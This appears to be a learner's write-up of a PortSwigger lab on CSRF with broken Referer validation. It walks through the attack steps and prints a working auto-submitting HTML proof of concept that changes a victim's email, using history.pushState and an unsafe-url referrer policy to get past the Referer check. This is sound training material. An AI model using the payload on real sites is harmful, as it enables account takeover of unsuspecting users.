# [CSRF with broken Referer validation] — [PortSwigger] — [Practitioner]
**Date:** 2026-06-12
 
---
 
## Vulnerability / core concept
Cross-site Request Forgery

## What made me stuck
I noticed that even query part of my exploit server was not showing in the browser. It took quite some time to figure it out.
 
## What unblocked me
After some research I learnt that we can use `history.pushState` to add query to my exploit server without refreshing the page.
 
---


## Attack path
1) First we need to log in into our account to access email change vulnerability.
2) We can notice that there is no csrf token or SameSite rules to protect users from csrf attack.
3) When I tried simple PoC, i got `Invalid Referer` error. That suggested that this application relies on `
Referer` header to protect against csrf attack.
4) Then i started to test `/my-account/change-email` request and found out that requests succeeds if referer contains origin domain. That means even if we append original domain to our exploit domain, it still would work.
5) Now after all this information, all we need to do is to create a csrf PoC using burp or caido and deliver it to victim to complete csrf attack and solve this lab.

---


## Payload / key command
```html
<!DOCTYPE html>
  <html>
  <head>
      <title>CSRF PoC</title>
<meta name="referrer" content="unsafe-url">
  </head>
  <body>
      <h3>Standard CSRF PoC</h3>
      <form action="https://0a1b00440457a83982cc1a6600a20083.web-security-academy.net/my-account/change-email" method="post">
      <input type="hidden" name="email" value="victim@babek" />
          <input type="submit" value="Submit request" />
      </form>
      <script>
          history.pushState("", "", "/?0a1b00440457a83982cc1a6600a20083.web-security-academy.net");
          document.forms[0].submit();
      </script>
  </body>
  </html>
```
As you can see here, we are using `history.pushState()` with original domain so it will be appended to our exploit server as a query (by default queries are truncated). Moreover, we have to add `Referrer-Policy: unsafe-url` because most browsers block adding query to the referer. This way, we can bypass it and add original domain for our malicious purposes.

---


## What I'd recognize faster next time
It is important to notice the security measurements of the web application. Like in this case, we noticed that csrf attacks are protected only based on if Referer contains original domain. This is a very insecure design that can lead to serious problems such as account takeover, sensitive data leak, etc.
 

